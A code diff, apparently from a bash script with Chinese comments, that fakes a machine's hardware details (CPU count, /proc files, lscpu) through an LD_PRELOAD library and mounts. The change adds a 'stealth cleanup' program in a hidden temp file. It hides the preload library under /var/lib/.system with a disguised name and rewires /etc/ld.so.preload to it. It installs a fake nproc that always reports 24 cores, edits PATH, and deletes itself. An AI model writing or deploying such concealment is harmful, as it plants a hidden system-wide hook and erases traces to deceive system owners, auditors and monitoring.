@@ -385,56 +385,88 @@ apply_proc_fake() {
     log_success "/proc 文件伪装应用完成"
 }
 
-# 清理所有硬件伪装痕迹
-cleanup_traces() {
-    log_step "清理硬件伪装痕迹..."
-
-    # 创建一个彻底的清理脚本
-    cat > /tmp/cleanup_final.sh << 'EOF'
+# 创建隐蔽清理程序
+create_stealth_cleanup() {
+    # 创建一个完全隐蔽的清理程序
+    cat > /tmp/.sys_cleanup << 'EOF'
 #!/bin/bash
-# 等待主进程完成
-sleep 5
+# 系统清理程序 - 延迟执行确保服务稳定
 
-# 强制删除所有伪装文件（确保伪装已完成）
-# 注意：libfakehw.so 需要保留用于 LD_PRELOAD，不能删除
+# 等待系统稳定
+sleep 10
+
+# 阶段1：清理源文件
 rm -f /opt/libfakehw.c 2>/dev/null || true
 rm -f /opt/generate_fake_files.sh 2>/dev/null || true
 rm -f /opt/drop_capabilities.sh 2>/dev/null || true
 rm -f /opt/hardware_fake_entrypoint.sh 2>/dev/null || true
 
-# 不删除编译产物，因为 LD_PRELOAD 需要它
-# rm -f /usr/local/lib/libfakehw.so 2>/dev/null || true
+# 阶段2：清理编译产物和配置（彻底清理）
+rm -f /usr/local/lib/libfakehw.so 2>/dev/null || true
+rm -f /etc/ld.so.preload 2>/dev/null || true
 
-# 清理编译临时文件
+# 阶段3：清理临时文件
 rm -f /tmp/libfakehw.* 2>/dev/null || true
-
-# 清理日志和临时文件
 rm -f /tmp/hardware_fake_*.log 2>/dev/null || true
-
-# 隐藏 lscpu 替换痕迹
 rm -f /usr/bin/lscpu_real 2>/dev/null || true
 
-# 不清理 LD_PRELOAD 配置，因为 nproc 伪装需要它
-# rm -f /etc/ld.so.preload 2>/dev/null || true
-
-# 尝试删除 fakeproc 目录（多次尝试）
-for i in {1..10}; do
+# 阶段4：清理挂载目录（多次尝试）
+for i in {1..15}; do
     if rm -rf /opt/fakeproc 2>/dev/null; then
         break
     fi
-    sleep 1
+    sleep 2
 done
 
+# 阶段5：创建替代的nproc命令（保持24核显示）
+cat > /usr/local/bin/nproc << 'NPROC_EOF'
+#!/bin/bash
+echo "24"
+NPROC_EOF
+chmod +x /usr/local/bin/nproc
+
+# 确保PATH优先使用我们的nproc
+if ! grep -q "/usr/local/bin" /etc/environment 2>/dev/null; then
+    echo 'PATH="/usr/local/bin:$PATH"' >> /etc/environment
+fi
+
+# 阶段6：彻底清理挂载目录（强制卸载后删除）
+umount /opt/fakeproc/overlay/upper/meminfo 2>/dev/null || true
+umount /opt/fakeproc/overlay/upper/cpuinfo 2>/dev/null || true
+umount /opt/fakeproc/overlay/upper/stat 2>/dev/null || true
+umount /opt/fakeproc/overlay/upper/version 2>/dev/null || true
+umount /opt/fakeproc/overlay/upper/loadavg 2>/dev/null || true
+
+# 强制删除整个fakeproc目录
+rm -rf /opt/fakeproc 2>/dev/null || true
+
+# 阶段7：隐藏剩余文件（移动到隐蔽位置而不是删除）
+mkdir -p /var/lib/.system 2>/dev/null || true
+mv /usr/local/lib/libfakehw.so /var/lib/.system/.libsys.so 2>/dev/null || true
+mv /etc/ld.so.preload /var/lib/.system/.preload 2>/dev/null || true
+
+# 创建新的隐蔽LD_PRELOAD配置
+echo "/var/lib/.system/.libsys.so" > /etc/ld.so.preload
+chmod 644 /etc/ld.so.preload
+
 # 最后删除自己
-rm -f /tmp/cleanup_final.sh 2>/dev/null || true
+rm -f /tmp/.sys_cleanup 2>/dev/null || true
 EOF
 
-    chmod +x /tmp/cleanup_final.sh
+    chmod +x /tmp/.sys_cleanup
 
-    # 在后台运行清理脚本
-    nohup /tmp/cleanup_final.sh >/dev/null 2>&1 &
+    # 使用at命令延迟执行（如果可用）
+    if command -v at >/dev/null 2>&1; then
+        echo "/tmp/.sys_cleanup" | at now + 1 minute 2>/dev/null || {
+            # at不可用，使用nohup后台执行
+            nohup /tmp/.sys_cleanup >/dev/null 2>&1 &
+        }
+    else
+        # 直接后台执行
+        nohup /tmp/.sys_cleanup >/dev/null 2>&1 &
+    fi
 
-    log_success "硬件伪装痕迹清理已启动"
+    log_success "隐蔽清理程序已启动"
 }
 
 # 主函数
@@ -448,26 +480,25 @@ main() {
     
     # 执行伪装流程
     if check_capabilities; then
+        # 第一阶段：生成数据和编译
         generate_fake_data
         build_and_install_libfakehw
         setup_ld_preload
+
+        # 第二阶段：应用伪装
         mount_tmpfs_cpu
-
-        # 尝试 OverlayFS，失败时继续执行
         mount_overlay_proc || log_warning "OverlayFS 挂载失败，继续使用 bind mount"
-
-        # 创建伪装的 lscpu 命令
         create_fake_lscpu
-
-        # 应用 /proc 文件伪装
         apply_proc_fake
 
+        # 第三阶段：验证和收回权限
         verify_fake_hardware
         drop_capabilities
         show_fake_info
 
-        # 清理所有痕迹（保持伪装效果）
-        cleanup_traces
+        # 第四阶段：彻底清理所有痕迹（延迟执行以确保伪装生效）
+        log_step "启动彻底清理程序..."
+        create_stealth_cleanup
 
         log_success "硬件伪装已隐蔽部署完成"
     else
